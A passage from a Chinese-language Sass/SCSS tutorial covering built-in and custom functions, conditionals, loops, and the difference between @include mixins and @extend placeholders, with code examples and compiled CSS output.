class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="function"><a href="#function" class="headerlink" title="@function"></a>@function</h3><p>@function与@mixin，%这两者的第一点不同在于sass本身就有一些内置的函数，方便我们调用，如强大的color函数；其次就是它返回的是一个值，而不是一段css样式代码什么的。</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$f00</span>: <span class="number">#f00</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//作为变量值</span></span><br><span class="line"><span class="variable">$redDark</span>: darken(<span class="variable">$f00</span>,<span class="number">10%</span>) !default;</span><br><span class="line"></span><br><span class="line"><span class="comment">//作为属性值</span></span><br><span class="line"><span class="selector-tag">p</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: darken(<span class="variable">$f00</span>,<span class="number">70%</span>);</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="variable">$redDark</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="rgba"><a href="#rgba" class="headerlink" title="rgba"></a>rgba</h4><p>分为两种：<code>rgba($red, $green, $blue, $alpha)</code>和<code>rgba($color, $alpha)</code>。</p><p>第一种跟css3一样，不介绍，第二种对我们有点用，实例：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rgba(#102030, 0.5) =&gt; rgba(16, 32, 48, 0.5)</span><br><span class="line">rgba(blue, 0.2)    =&gt; rgba(0, 0, 255, 0.2)</span><br></pre></td></tr></table></figure><h4 id="ie-hex-str"><a href="#ie-hex-str" class="headerlink" title="ie-hex-str"></a>ie-hex-str</h4><p>ie-hex-str($color)</p><p>这个函数将一个颜色格式化成ie滤镜使用，在做css3使用滤镜兼容的时候用得上，实例：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ie-hex-str(#abc) =&gt; #FFAABBCC</span><br><span class="line">ie-hex-str(#3322BB) =&gt; #FF3322BB</span><br><span class="line">ie-hex-str(rgba(0, 255, 0, 0.5)) =&gt; #8000FF00</span><br></pre></td></tr></table></figure><h4 id="darken"><a href="#darken" class="headerlink" title="darken"></a>darken</h4><p>darken(color,color,amount)</p><p>第一个参数是颜色，第二参数是百分数介于0%-100%，表示将某个颜色变暗多少个百分比。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">darken(hsl(25, 100%, 80%), 30%) =&gt; hsl(25, 100%, 50%)</span><br><span class="line">darken(#800, 20%) =&gt; #200</span><br></pre></td></tr></table></figure><h4 id="lighten"><a href="#lighten" class="headerlink" title="lighten"></a>lighten</h4><p>lighten(color,color,amount)</p><p>第一个参数是颜色，第二参数是百分数介于0%-100%，表示将某个颜色变亮多少个百分比。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lighten(hsl(0, 0%, 0%), 30%) =&gt; hsl(0, 0, 30)</span><br><span class="line">lighten(#800, 20%) =&gt; #e00</span><br></pre></td></tr></table></figure><h4 id="percentage"><a href="#percentage" class="headerlink" title="percentage"></a>percentage</h4><p>percentage($value)： 将一个没有单位的数字转成百分比形式</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">percentage(0.2) =&gt; 20%</span><br><span class="line">percentage(100px / 50px) =&gt; 200%</span><br></pre></td></tr></table></figure><h4 id="length"><a href="#length" class="headerlink" title="length"></a>length</h4><p>length($list)</p><p>返回一个列表的长度</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">length(10px) =&gt; 1</span><br><span class="line">length(#514721 #FFF6BF #FFD324) =&gt; 3</span><br></pre></td></tr></table></figure><h4 id="nth"><a href="#nth" class="headerlink" title="nth"></a>nth</h4><p>nth(list,list,n);</p><p>返回列表里面第n个位置的值</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nth(10px 20px 30px, 1) =&gt; 10px</span><br><span class="line">nth((Helvetica, Arial, sans-serif), 3) =&gt; sans-serif</span><br></pre></td></tr></table></figure><h4 id="unit"><a href="#unit" class="headerlink" title="unit"></a>unit</h4><p>unit($number)</p><p>得到这个数的单位</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">unit(100) =&gt; ""</span><br><span class="line">unit(100px) =&gt; "px"</span><br><span class="line">unit(3em) =&gt; "em"</span><br><span class="line">unit(10px * 5em) =&gt; "em*px"</span><br><span class="line">unit(10px * 5em / 30cm / 1rem) =&gt; "em*px/cm*rem"</span><br></pre></td></tr></table></figure><h4 id="unitless"><a href="#unitless" class="headerlink" title="unitless"></a>unitless</h4><p>unitless($number)</p><p>返回这个数是否没有单位</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unitless(100) =&gt; true</span><br><span class="line">unitless(100px) =&gt; false</span><br></pre></td></tr></table></figure><h4 id="三目判断"><a href="#三目判断" class="headerlink" title="三目判断"></a>三目判断</h4><p>if(condition,condition,if-true, $if-false)</p><p>第一个表示条件，第二个表示条件为真的值，第三个表示为假的值</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(true, 1px, 2px) =&gt; 1px</span><br><span class="line">if(false, 1px, 2px) =&gt; 2px</span><br></pre></td></tr></table></figure><p>注意函数是返回一个值，不能直接放到sass里面直接去运行的，会报错。</p><p>你可以把这些用在判断或者属性值里面，那么就是一级棒。</p><p>下面我们来搞点自己定义的函数吧，先来个简单的：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// px转em</span></span><br><span class="line">@function pxToEm(<span class="variable">$px</span>, <span class="variable">$base</span>: 16) &#123;</span><br><span class="line">  @return (<span class="variable">$px</span> / <span class="variable">$base</span>) * 1em;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 调用下：</span></span><br><span class="line"><span class="selector-tag">p</span>&#123;</span><br><span class="line">  <span class="attribute">font-size</span>:pxToEm(<span class="number">20</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 解析后的css：</span></span><br><span class="line"><span class="selector-tag">p</span> &#123;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">1.25em</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="if和-else"><a href="#if和-else" class="headerlink" title="@if和@else"></a>@if和@else</h3><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filter</span>:false !default; <span class="comment">//是否开启ie滤镜</span></span><br><span class="line"><span class="comment">//背景色半透明</span></span><br><span class="line">@<span class="keyword">mixin</span> bgcolor-alpha(<span class="variable">$bgcolor</span>: rgba(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,.<span class="number">5</span>))&#123;</span><br><span class="line">  <span class="attribute">color</span>:<span class="number">#fff</span>;</span><br><span class="line">  @<span class="keyword">if</span> <span class="variable">$filter</span>&#123;</span><br><span class="line">  <span class="attribute">filter</span>:progid:DXImageTransform.Microsoft.gradient(enabled=<span class="string">'true'</span>,startColorstr=<span class="string">'#&#123;ie-hex-str($bgcolor)&#125;'</span>, endColorstr=<span class="string">'#&#123;ie-hex-str($bgcolor)&#125;'</span>);</span><br><span class="line">  &#125;@<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#333</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="attribute">background-color</span>:<span class="variable">$bgcolor</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是半透明rgba背景的一段代码，高级浏览器用rgba，ie6-8如果开启滤镜用滤镜，不开启滤镜就用纯色，常用于图片下方浮现标题。</p><p>当然也不可能总是判断一个变量的真假那么简单，没有或与非的情况吧。sass的@if用<code>not,or,and</code>分别表示非，或，与。</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>:   false !default;</span><br><span class="line"><span class="variable">$b</span>:   true !default;</span><br><span class="line"></span><br><span class="line">@<span class="keyword">if</span> not(<span class="variable">$a</span>)&#123;</span><br><span class="line">  <span class="selector-tag">p</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>:red;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">div</span>&#123;</span><br><span class="line">  <span class="attribute">font-size</span>:<span class="number">14px</span>;</span><br><span class="line">  @<span class="keyword">if</span> <span class="variable">$a</span> or <span class="variable">$b</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>:<span class="number">300px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">li</span>&#123;</span><br><span class="line">  <span class="attribute">line-height</span>:<span class="number">24px</span>;   </span><br><span class="line">  @<span class="keyword">if</span> <span class="variable">$a</span> and <span class="variable">$b</span>&#123;</span><br><span class="line">    <span class="attribute">float</span>:left;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>想想还是漏了个，sass用<code>==,!=</code>分别表示等于与不等于。</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$radius</span>: <span class="number">5px</span> !default;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box-border</span>&#123;</span><br><span class="line">  <span class="attribute">border</span>:<span class="number">1px</span> solid <span class="number">#ccc</span>;</span><br><span class="line">  <span class="attribute">padding</span>:<span class="number">10px</span>;</span><br><span class="line"></span><br><span class="line">  @<span class="keyword">if</span> <span class="variable">$radius</span> != 0&#123;</span><br><span class="line">    <span class="attribute">border-radius</span>:<span class="variable">$radius</span>; </span><br><span class="line">  &#125;</span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="variable">$sizeClass</span>: small !default;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.size</span>&#123;</span><br><span class="line">  @<span class="keyword">if</span> <span class="variable">$sizeClass</span> == <span class="string">'small'</span>&#123;</span><br><span class="line">    <span class="attribute">padding</span>:<span class="number">5px</span>;</span><br><span class="line">  &#125;@<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="attribute">padding</span>:<span class="number">10px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="for"><a href="#for" class="headerlink" title="@for"></a>@for</h3><p>for循环有两种形式，分别为：<code></code>@for $var from start through end<code>和</code>@for $var start from to  end` 。$i表示变量，start表示起始值，end表示结束值，这两个的区别是关键字through表示包括end这个数，而to则不包括end这个数。先来个简单的：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">for</span> <span class="variable">$i</span> from 1 through 3 &#123;</span><br><span class="line">  <span class="selector-class">.item-</span>#&#123;<span class="variable">$i</span>&#125; &#123; <span class="attribute">width</span>: <span class="number">2em</span> * <span class="variable">$i</span>; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="each"><a href="#each" class="headerlink" title="@each"></a>@each</h3><p>语法：@each $var in</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">each</span> <span class="variable">$animal</span> in puma, sea-slug, egret, salamander &#123;</span><br><span class="line">  .#&#123;<span class="variable">$animal</span>&#125;-<span class="attribute">icon</span> &#123;</span><br><span class="line">    <span class="attribute">background-image</span>: url(<span class="string">'/images/#&#123;$animal&#125;.png'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sprite</span>: puma sea-slug egret salamander !default;</span><br><span class="line"></span><br><span class="line">%sprite-animal&#123;</span><br><span class="line">    <span class="attribute">background</span>: url(<span class="string">'/images/animal.png'</span>) no-repeat;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">each</span> <span class="variable">$animal</span> in <span class="variable">$sprite</span> &#123;</span><br><span class="line">    .#&#123;<span class="variable">$animal</span>&#125;-<span class="attribute">icon</span> &#123;</span><br><span class="line">        @<span class="keyword">extend</span> %sprite-animal;     </span><br><span class="line">        <span class="attribute">background-position</span>:<span class="number">0</span> -(index(<span class="variable">$sprite</span>,<span class="variable">$animal</span>)*<span class="number">30px</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用scss设计按钮样式：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//$btnColorClass: (primary #0078E7 #fff) (green $green #fff);</span></span><br><span class="line"><span class="variable">$btnColorClass</span>: (primary <span class="number">#0078E7</span> <span class="number">#fff</span>) (blue <span class="number">#00A3CF</span> <span class="number">#fff</span>) (orange <span class="number">#F47837</span> <span class="number">#fff</span>) !default;</span><br><span class="line"></span><br><span class="line">@<span class="keyword">mixin</span> btn-color(<span class="variable">$bgColor</span>:<span class="number">#e6e6e6</span>, <span class="variable">$textColor</span>:<span class="number">#333</span>)&#123;</span><br><span class="line">  <span class="attribute">color</span>:<span class="variable">$textColor</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="variable">$bgColor</span>;</span><br><span class="line">  <span class="attribute">border</span>:<span class="number">1px</span> solid darken(<span class="variable">$bgColor</span>, <span class="number">5%</span>);</span><br><span class="line">  <span class="attribute">border-color</span>:lighten(<span class="variable">$bgColor</span>, <span class="number">2%</span>) darken(<span class="variable">$bgColor</span>, <span class="number">5%</span>) darken(<span class="variable">$bgColor</span>, <span class="number">5%</span>) lighten(<span class="variable">$bgColor</span>, <span class="number">2%</span>);</span><br><span class="line"></span><br><span class="line">  &amp;:hover&#123;</span><br><span class="line">    <span class="attribute">background-color</span>: darken(<span class="variable">$bgColor</span>,<span class="number">5%</span>);</span><br><span class="line">    <span class="attribute">color</span>:<span class="variable">$textColor</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="keyword">each</span> <span class="variable">$colorClass</span> in <span class="variable">$btnColorClass</span>&#123;</span><br><span class="line">  <span class="variable">$class</span>:      nth(<span class="variable">$colorClass</span>,<span class="number">1</span>);</span><br><span class="line">  <span class="variable">$bgColor</span>:    nth(<span class="variable">$colorClass</span>,<span class="number">2</span>);</span><br><span class="line">  <span class="variable">$textColor</span>:  nth(<span class="variable">$colorClass</span>,<span class="number">3</span>);</span><br><span class="line">  <span class="selector-class">.btn-</span>#&#123;<span class="variable">$class</span>&#125;&#123;</span><br><span class="line">    @<span class="keyword">include</span> btn-color(<span class="variable">$bgColor</span>,<span class="variable">$textColor</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="include-vs-extend"><a href="#include-vs-extend" class="headerlink" title="@include vs @extend"></a>@include vs @extend</h2><p>避免代码重复生成，</p><p>SASS中产生了Mixins，我们可以将相似的样式定义成一个函数模块，然后通过<code>@include</code>来调用。但很多时候，我们又不需要这么强大的功能。</p><p>这个时候出现<code>@extend</code>来调用定义好相同样式的类，可没想到，这个功能是方便了，但无形中为使用者埋下了一个地雷。</p><p>为了解除这个隐患，在SASS3.2中增加了一个<code>%placeholders</code>功能。让大家能很方便定义一些功能简单的相同样式模块。</p><p>通过前面的介绍<code>@mixin</code>需要<code>@include</code>来调用，而<code>.class</code>和<code>%placeholders</code>需要<code>@extend</code>来调用，那么两者有何区别呢？</p><ul><li><code>@include</code>主要是用来调用<code>@mixin</code>定义的函数模块。在<code>@mixin</code>中可以定义一个相似功能样式，而且可以设置变量、定义参数和默认参数值；</li><li><code>@extend</code>主要是用来调用<code>.class</code>或者<code>%placeholders</code>定义的属性模块；在<code>.class</code>或者<code>%placeholders</code>中可以定义一个相同样式，但这里面不能定义参数；</li><li><code>@include</code>每次调用相同的<code>@mixin</code>时，编译出来的CSS相同样式不会进行合并；</li><li><code>@extend</code>每次调用相同的 <code>.class</code>时，如果<code>.class</code>在样式出现多次，那么编译出来的CSS有可能不是需要的样式；</li><li><code>@extend</code>每次调用相同的<code>%placeholders</code>时，编译出来的CSS相同样式会进行合并。</li></ul><p>下面我们通过一个清除浮动的案例，分别看看<code>@include</code>和<code>@extend</code>之间的区别：</p><h3 id="include与-mixin使用例子"><a href="#include与-mixin使用例子" class="headerlink" title="@include与@mixin使用例子"></a><code>@include</code>与<code>@mixin</code>使用例子</h3><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">mixin</span> clearfix&#123;</span><br><span class="line">    &amp; &#123;</span><br><span class="line">      *zoom: <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &amp;:before,</span><br><span class="line">    &amp;:after &#123;</span><br><span class="line">      <span class="attribute">display</span>: table;</span><br><span class="line">      <span class="attribute">content</span>: <span class="string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &amp;:after &#123;</span><br><span class="line">      <span class="attribute">clear</span>: both;</span><br><span class="line">      <span class="attribute">overflow</span>: hidden;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">ul</span>&#123;</span><br><span class="line">  @<span class="keyword">include</span> clearfix;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.block</span> &#123;</span><br><span class="line">  @<span class="keyword">include</span> clearfix;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译后：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">ul</span> &#123;</span><br><span class="line">  *zoom: 1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">ul</span><span class="selector-pseudo">:before</span>, <span class="selector-tag">ul</span><span class="selector-pseudo">:after</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: table;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">ul</span><span class="selector-pseudo">:after</span> &#123;</span><br><span class="line">  <span class="attribute">clear</span>: both;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.block</span> &#123;</span><br><span class="line">  *zoom: 1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.block</span><span class="selector-pseudo">:before</span>, <span class="selector-class">.block</span><span class="selector-pseudo">:after</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: table;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.block</span><span class="selector-pseudo">:after</span> &#123;</span><br><span class="line">  <span class="attribute">clear</span>: both;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显，相同的样式不会进行合并。</p><h3 id="include和-placeholders使用例子"><a href="#include和-placeholders使用例子" class="headerlink" title="@include和%placeholders使用例子"></a><code>@include</code>和<code>%placeholders</code>使用例子</h3><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">%clearfix&#123;</span><br><span class="line">    &amp; &#123;</span><br><span class="line">      *zoom: <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &amp;:before,</span><br><span class="line">    &amp;:after &#123;</span><br><span class="line">        <span class="attribute">display</span>: table;</span><br><span class="line">        <span class="attribute">content</span>: <span class="string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &amp;:after &#123;</span><br><span class="line">        <span class="attribute">clear</span>: both;</span><br><span class="line">        <span class="attribute">overflow</span>: hidden;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">ul</span>&#123;</span><br><span class="line">  @<span class="keyword">extend</span> %clearfix;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.block</span> &#123;</span><br><span class="line">  @<span class="keyword">extend</span> %clearfix;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译后：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.block</span>, <span class="selector-tag">ul</span> &#123;</span><br><span class="line">  *zoom: 1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.block</span><span class="selector-pseudo">:before</span>, <span class="selector-tag">ul</span><span class="selector-pseudo">:before</span>, <span class="selector-class">.block</span><span class="selector-pseudo">:after</span>, <span class="selector-tag">ul</span><span class="selector-pseudo">:after</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: table;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.block</span><span class="selector-pseudo">:after</span>, <span class="selector-tag">ul</span><span class="selector-pseudo">:after</span> &#123;</span><br><span class="line">  <span class="attribute">clear</span>: both;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显相同样式代码已经进行合并。</p><h3 id="Mixins与-placeholders的结合"><a href="#Mixins与-placeholders的结合" class="headerlink" title="Mixins与%placeholders的结合"></a>Mixins与%placeholders的结合</h3><p>Mixins如果使用不当，就会产生很多重复的代码，但仅用<code>@extend</code>很多时候又无法达到功能上的需求。</p><p>那么有没有方法能把Mixins与<code>%placeholders</code>结合起来，取他们各自的优势呢？</p><p>大家都知道,<code>%placeholders</code>就类似于CSS中的<code>.classes</code>或者<code>#ids</code>，只不过使用<code>%</code>代替了<code>.</code>和<code>#</code>。但<code>%placeholders</code>中的代码只有通过 <code>@extend</code>调用之后才会产生代码量，不然他是不会产生任何代码量。</p><p>下面我们来看一个Mixins与<code>%placeholders</code>结合在一起制作的一个网格系统。</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">%grid &#123;</span><br><span class="line">  <span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">  <span class="attribute">display</span>: inline-block;</span><br><span class="line">  <span class="attribute">padding-left</span>: <span class="number">1em</span>;</span><br><span class="line">  <span class="attribute">padding-right</span>: <span class="number">1em</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="keyword">mixin</span> grid(<span class="variable">$width</span>: 1)&#123;</span><br><span class="line">  @<span class="keyword">extend</span> %grid;</span><br><span class="line">  <span class="attribute">width</span>: percentage(<span class="variable">$width</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.grid-half</span> &#123;</span><br><span class="line">  @<span class="keyword">include</span> grid(<span class="number">1</span> / 2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.grid-third</span> &#123;</span><br><span class="line">  @<span class="keyword">include</span> grid(<span class="number">1</span> / 3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>按照这样的方法，我们可以制作出一个简单的百分比网格系统：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$columns</span>: <span class="number">12</span>;</span><br><span class="line"><span class="variable">$gutter</span>: <span class="number">2em</span>;</span><br><span class="line"></span><br><span class="line">%grid &#123;</span><br><span class="line">  <span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">  <span class="attribute">display</span>: inline-block;</span><br><span class="line">  <span class="attribute">padding</span>: &#123;</span><br><span class="line">    left:<span class="variable">$gutter</span> / <span class="number">2</span>;</span><br><span class="line">    <span class="attribute">right</span>:<span class="variable">$gutter</span> / <span class="number">2</span>;</span><br><span class="line">  &#125;   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="keyword">mixin</span> grid(<span class="variable">$width</span>: 1)&#123;</span><br><span class="line">  @<span 